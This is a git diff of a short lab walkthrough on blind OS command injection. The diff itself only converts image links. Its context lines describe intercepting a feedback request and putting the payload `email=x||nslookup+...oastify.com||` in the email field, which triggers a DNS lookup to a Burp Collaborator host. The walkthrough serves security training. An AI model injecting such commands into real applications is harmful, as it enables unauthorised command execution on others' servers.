@@ -14,9 +14,9 @@
 
 click on submit feedback and intercept the request
 
-![[lab4_0.png]]
+![](images/lab4_0.jpg)
 
-![[lab4_1.png]]
+![](images/lab4_1.jpg)
 
 
 step 2
@@ -29,9 +29,9 @@ final payload
 `email=x||nslookup+x.ne5hvt6bna30e2cdp7h3vkix3o9fx5lu.oastify.com||`
 
 
-![[lab4_2.png]]
+![](images/lab4_2.jpg)
 
-![[lab4_3.png]]
+![](images/lab4_3.jpg)
 
 step 3 
 
@@ -39,10 +39,10 @@ step 3
 replace email with payload and forward request
 go to  burp collaborator you will see some DNS if you can't see click on poll now and lab will solved
 
-![[lab4_4.png]]
+![](images/lab4_4.jpg)
 
-![[lab4_5.png]]
+![](images/lab4_5.jpg)
 
 
-![[lab4_6.png]]
+![](images/lab4_6.jpg)
 
